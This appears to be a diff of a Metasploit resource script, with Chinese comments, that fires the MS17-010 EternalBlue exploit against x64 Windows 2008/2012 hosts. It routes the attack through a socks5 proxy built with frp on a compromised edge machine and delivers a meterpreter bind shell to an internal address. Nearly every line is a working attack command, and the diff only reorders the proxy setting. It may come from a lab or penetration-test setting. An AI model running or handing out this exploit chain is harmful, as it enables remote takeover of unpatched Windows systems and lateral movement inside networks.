@@ -1,9 +1,10 @@
 # 只适用x64 win2008 win2012, x86用 ms17_010_command
 # kali 运行 frps, frp 上传到边缘机并添加socks5代理
 # 如果手动 set Proxies要先 route flush
+setg proxies socks5:39.99.139.21:1234
+
 route flush
 use exploit/windows/smb/ms17_010_eternalblue
-setg proxies socks5:39.99.139.21:1234
 set payload windows/x64/meterpreter/bind_tcp
 set rhosts 172.22.15.24
 exploit
